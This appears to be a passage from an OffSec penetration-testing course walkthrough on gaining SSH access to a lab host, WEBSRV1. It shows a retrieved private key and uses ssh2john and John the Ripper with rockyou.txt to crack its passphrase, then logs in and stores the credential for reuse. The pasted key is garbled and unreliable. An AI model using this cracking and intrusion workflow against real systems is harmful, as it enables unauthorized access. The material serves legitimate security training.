# OffSec

```
- BEGIN OPENSSH PRIVATE KEY -
b3bBlbnZacR1XtkdtYAAAAAMAMLcIIlNIjdHAAAYAGMNyeXB0AAAAAAAABELTUsf
3CyylJ3YdRRAAAAAAAAAGXAAAAAAA3nzaC2EEADAAAAABQABQODI15EIYq
KLp2Zm6pm77GU/GTN7499M/sq7XLuVsPZSK9h//LSvF6QYNHRX3FueCapu/bOHR
+tN4AEEjK4B0g21ViHu66F0OWZTYK92LC03ybtOg6B4k40fP4fEEBMLmKTSK03dCStUPrRCMvq
UoRBJeKclUbN2Vj62ZwrTRLIwPSKY/UlhhMg2r1SFMcHbcFb0j89YgUau
bdbqmdS57Q2RUTdK2LC03ybtOg6B4k40f4fEEBMLmKTSK03dC1p1uS2ZmRAI1dVf600bt0f6//U044CNJtkkRyKeAs0Z1DNLEHFAzrLrRhBm
Qud0pTMVlJcefY4IGGU4=
- END OPENSSH PRIVATE KEY-
```

Listing 877 - Retrieving the SSH private key of daniela

Listing 877 shows that we have successfully retrieved the SSH private key of daniela. The key in the current directory id_rsa

Next, let's attempt to access this WEBSRV1 via daniela as SSH. To do so, we will have to modify the permissions of the file several times in this.

```
kali@kali:~/beyond/websrv1 chmod 600 id_rsa

kali@kali:~/beyond/websrv1 ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa':
```

Listing 878 - Retrieving the SSH private key via access WEBSRV1

Listing 878 shows that the SSH private key is protected by a passphrase. Therefore, let's attempt to crack it using ssh2john john with the rockyou.txt list. After a few moments, the cracking attempt is successful in the following list:

```
kali@kali:~/beyond/websrv1 ssh2john id_rsa > ssh.hash
kali@kali:~/beyond/websrv1 john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
tequieromucho (id_rsa)
```

Listing 879 - Cracking the passphrase to access the system via SSH by the private key

Now, let's attempt to access the system via SSH by providing the passphrase.

```
kali@kali:~/beyond/websrv1 ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa':nWelcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
daniela@websrv1:-
```

Listing 880 - Accessing WEBSRV1 via SSH

Success! We gained access to the first target in the penetration test.

Before we head into the next section, we will perform post-exploitation enumeration, let's add the cracked passphrase to the creds.txt file in the work environment. As users need to reuse passwords and passphrases, we may need it later in this assessment.